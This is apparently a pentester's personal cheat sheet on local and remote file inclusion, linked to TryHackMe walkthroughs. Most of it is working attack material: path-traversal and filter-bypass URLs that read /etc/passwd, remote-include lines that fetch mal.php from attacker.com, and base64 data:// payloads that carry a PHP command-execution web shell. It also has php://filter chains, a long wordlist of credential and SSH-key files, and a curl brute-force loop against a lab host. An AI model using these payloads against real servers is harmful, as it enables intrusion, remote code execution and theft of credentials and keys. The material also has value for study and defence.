# LFI / RFI

## Useful Links

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}

{% embed url="https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet" %}



## Basic LFI and bypasses <a href="#basic-lfi-and-bypasses" id="basic-lfi-and-bypasses"></a>

**Examples**

[team.md](../../walkthroughs/tryhackme/team.md "mention")

```
http://example.com/index.php?page=../../../etc/passwd
http://dev.team.thm/script.php?page=/../../../../../etc/passwd
```

#### traversal sequences stripped non-recursively <a href="#traversal-sequences-stripped-non-recursively" id="traversal-sequences-stripped-non-recursively"></a>

**Examples**

[file-inclusion.md](../../walkthroughs/tryhackme/file-inclusion.md "mention")[team.md](../../walkthroughs/tryhackme/team.md "mention")

```
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
```

## **Null byte (%00)** <a href="#null-byte-00" id="null-byte-00"></a>

**Examples**

[file-inclusion.md](../../walkthroughs/tryhackme/file-inclusion.md "mention")

Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

```
http://example.com/index.php?page=../../../etc/passwd%00
```

This is **solved since PHP 5.4**

## **Encoding** <a href="#encoding" id="encoding"></a>

You could use non-standard encodings like double URL encode (and others):

```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

## From existent folder <a href="#from-existent-folder" id="from-existent-folder"></a>

Maybe the back-end is checking the folder path:

```
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```

## Exploring File System Directories on a Server <a href="#exploring-file-system-directories-on-a-server" id="exploring-file-system-directories-on-a-server"></a>

The file system of a server can be explored recursively to identify directories, not just files, by employing certain techniques. This process involves determining the directory depth and probing for the existence of specific folders. Below is a detailed method to achieve this:

1. **Determine Directory Depth:** Ascertain the depth of your current directory by successfully fetching the `/etc/passwd` file (applicable if the server is Linux-based). An example URL might be structured as follows, indicating a depth of three:

```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```

1. **Probe for Folders:** Append the name of the suspected folder (e.g., `private`) to the URL, then navigate back to `/etc/passwd`. The additional directory level requires incrementing the depth by one:

```
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```

1. **Interpret the Outcomes:** The server's response indicates whether the folder exists:
   * **Error / No Output:** The folder `private` likely does not exist at the specified location.
   * **Contents of `/etc/passwd`:** The presence of the `private` folder is confirmed.
2. **Recursive Exploration:** Discovered folders can be further probed for subdirectories or files using the same technique or traditional Local File Inclusion (LFI) methods.

For exploring directories at different locations in the file system, adjust the payload accordingly. For instance, to check if `/var/www/` contains a `private` directory (assuming the current directory is at a depth of 3), use:

```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```

#### **Path Truncation Technique** <a href="#path-truncation-technique" id="path-truncation-technique"></a>

Path truncation is a method employed to manipulate file paths in web applications. It's often used to access restricted files by bypassing certain security measures that append additional characters to the end of file paths. The goal is to craft a file path that, once altered by the security measure, still points to the desired file.

In PHP, various representations of a file path can be considered equivalent due to the nature of the file system. For instance:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
* When the last 6 characters are `passwd`, appending a `/` (making it `passwd/`) doesn't change the targeted file.
* Similarly, if `.php` is appended to a file path (like `shellcode.php`), adding a `/.` at the end will not alter the file being accessed.

The provided examples demonstrate how to utilize path truncation to access `/etc/passwd`, a common target due to its sensitive content (user account information):

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```



```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```

In these scenarios, the number of traversals needed might be around 2027, but this number can vary based on the server's configuration.

* **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) combined with extra dot segments and characters can be used to navigate the file system, effectively ignoring appended strings by the server.
* **Determining the Required Number of Traversals**: Through trial and error, one can find the precise number of `../` sequences needed to navigate to the root directory and then to `/etc/passwd`, ensuring that any appended strings (like `.php`) are neutralized but the desired path (`/etc/passwd`) remains intact.
* **Starting with a Fake Directory**: It's a common practice to begin the path with a non-existent directory (like `a/`). This technique is used as a precautionary measure or to fulfill the requirements of the server's path parsing logic.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

## **Filter bypass tricks** <a href="#filter-bypass-tricks" id="filter-bypass-tricks"></a>

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```

## Remote File Inclusion <a href="#remote-file-inclusion" id="remote-file-inclusion"></a>

In php this is disable by default because **`allow_url_include`** is **Off.** It must be **On** for it to work, and in that case you could include a PHP file from your server and get RCE:

**Examples**

[file-inclusion.md](../../walkthroughs/tryhackme/file-inclusion.md "mention")

```
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```

If for some reason **`allow_url_include`** is **On**, but PHP is **filtering** access to external webpages, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), you could use for example the data protocol with base64 to decode a b64 PHP code and egt RCE:



```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```

In the previous code, the final `+.txt` was added because the attacker needed a string that ended in `.txt`, so the string ends with it and after the b64 decode that part will return just junk and the real PHP code will be included (and therefore, executed).

Another example **not using the `php://` protocol** would be:



```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```

### Python Root element <a href="#python-root-element" id="python-root-element"></a>

In python in a code like this one:

Copy

```
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```

If the user passes an **absolute path** to **`file_name`**, the **previous path is just removed**:



```
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```

It is the intended behaviour according to [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

### Java List Directories <a href="#java-list-directories" id="java-list-directories"></a>

It looks like if you have a Path Traversal in Java and you **ask for a directory** instead of a file, a **listing of the directory is returned**. This won't be happening in other languages (afaik).

### Top 25 parameters <a href="#top-25-parameters" id="top-25-parameters"></a>

Here’s list of top 25 parameters that could be vulnerable to local file inclusion (LFI) vulnerabilities (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):

```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

### LFI / RFI using PHP wrappers & protocols <a href="#lfi-rfi-using-php-wrappers-and-protocols" id="lfi-rfi-using-php-wrappers-and-protocols"></a>

#### php://filter <a href="#php-filter" id="php-filter"></a>

PHP filters allow perform basic **modification operations on the data** before being it's read or written. There are 5 categories of filters:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
  * `string.rot13`
  * `string.toupper`
  * `string.tolower`
  * `string.strip_tags`: Remove tags from the data (everything between "<" and ">" chars)
    * Note that this filter has disappear from the modern versions of PHP
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
  * `convert.base64-encode`
  * `convert.base64-decode`
  * `convert.quoted-printable-encode`
  * `convert.quoted-printable-decode`
  * `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . To get the **list of all the encodings** supported run in the console: `iconv -l`

Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters).

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
  * `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
  * `zlib.inflate`: Decompress the data
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
  * `mcrypt.*` : Deprecated
  * `mdecrypt.*` : Deprecated
* Other Filters
  * Running in php `var_dump(stream_get_filters());` you can find a couple of **unexpected filters**:
    * `consumed`
    * `dechunk`: reverses HTTP chunked encoding
    * `convert.*`



```
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```

The part "php://filter" is case insensitive

#### Using php filters as oracle to read arbitrary files <a href="#using-php-filters-as-oracle-to-read-arbitrary-files" id="using-php-filters-as-oracle-to-read-arbitrary-files"></a>

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) is proposed a technique to read a local file without having the output given back from the server. This technique is based on a **boolean exfiltration of the file (char by char) using php filters** as oracle. This is because php filters can be used to make a text larger enough to make php throw an exception.

In the original post you can find a detailed explanation of the technique, but here is a quick summary:

* Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
  * This will be used to generate a **text so big when the initial letter is guessed correctly** that php will trigger an **error**
* The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
  * This, combined with the previous one (and other filters depending on the guessed letter), will allow us to guess a letter at the beggining of the text by seeing when we do enough transformations to make it not be an hexadecimal character. Because if hex, dechunk won't delete it and the initial bomb will make php error.
* The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
  * Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
  * When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
* The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
  * And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

In the post a tool to perform this automatically was also leaked: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

## &#x20;

##

##

## Find other php pages

**Kali**

```
ffuf -c -u http://$VICTIM/post.php?post=FUZZ -w SecLists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt > results.txt
cat results.txt | grep -v 2422
```



## Find system level files

Can use the list below to fill mylist.txt

**Kali**

```
ffuf -c -u http://$VICTIM/post.php?post=FUZZ -w mylist.txt > results.txt
cat results.txt | grep -v 2422
```









## Places to look if LFI is possible

| Location                    | Description                                                                                                                                                       |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /etc/issue                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| /etc/profile                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | specifies the version of the Linux kernel                                                                                                                         |
| /etc/passwd                 | has all registered user that has access to a system                                                                                                               |
| /etc/shadow                 | contains information about the system's users' passwords                                                                                                          |
| /root/.bash\_history        | contains the history commands for root user                                                                                                                       |
| /var/log/dmessage           | contains global system messages, including the messages that are logged during system startup                                                                     |
| /var/mail/root              | all emails for root user                                                                                                                                          |
| /root/.ssh/id\_rsa          | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| /var/log/apache2/access.log | the accessed requests for Apache webserver                                                                                                                        |
| C:\boot.ini                 | contains the boot options for computers with BIOS firmware                                                                                                        |
|                             |                                                                                                                                                                   |



Another good list of places to check if possible

```
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/.htpasswd
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/stat
/proc/swaps
/proc/version
/proc/self/net/arp
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

### LFI bruteforce script

**Examples**

[team.md](../../walkthroughs/tryhackme/team.md "mention")

**script.txt**

```
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/stat
/proc/swaps
/proc/version
/proc/self/net/arp
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

**script.sh**

```
while IFS="" read -r p || [ -n "$p" ]
do
  printf '%s\n' "$p"
  curl 'http://dev.team.thm/script.php?page='"$p"
done < paths.txt
```

**Kali**

```
chmod +x script.sh
./script > results.txt
```







**Copy cheat sheet**

[https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)



**PHP://** is a wrapper for Accessing various I/O streams. We&#x20;

**php://filter** — it is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. There are multiple parameters to this wrapper, we will use **convert.base64-encode/resource=** — This will convert the given file into base64 encoding and print it on screen. But we have to provide the resource what we want to read like a file name **index.php**.



**Bypasses**

<table><thead><tr><th>Bypass</th><th width="184.33333333333331">Explanation</th><th width="366.66666666666674">Example</th></tr></thead><tbody><tr><td>Bypass extension added</td><td>Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.</td><td>hxxp://10.10.230.14/lab3.php?file=../../../../../etc/passwd%00</td></tr><tr><td>PHP removing slashes</td><td>This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass.</td><td>hxxp://10.10.230.14/lab3.php?file=..//..//..//..//..//etc/passwd</td></tr><tr><td></td><td></td><td></td></tr></tbody></table>

### traversal sequences stripped non-recursively

```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

### **Null byte (%00)**

Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

```
http://example.com/index.php?page=../../../etc/passwd%00
```

### **Encoding**

You could use non-standard encondings like double URL encode (and others):

```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### From existent folder

Maybe the back-end is checking the folder path:

```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```

## LFI to RCE via Apache Log File Poisoning (PHP) <a href="#user-content-lfi-to-rce-via-apache-log-file-poisoning-php" id="user-content-lfi-to-rce-via-apache-log-file-poisoning-php"></a>

Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file

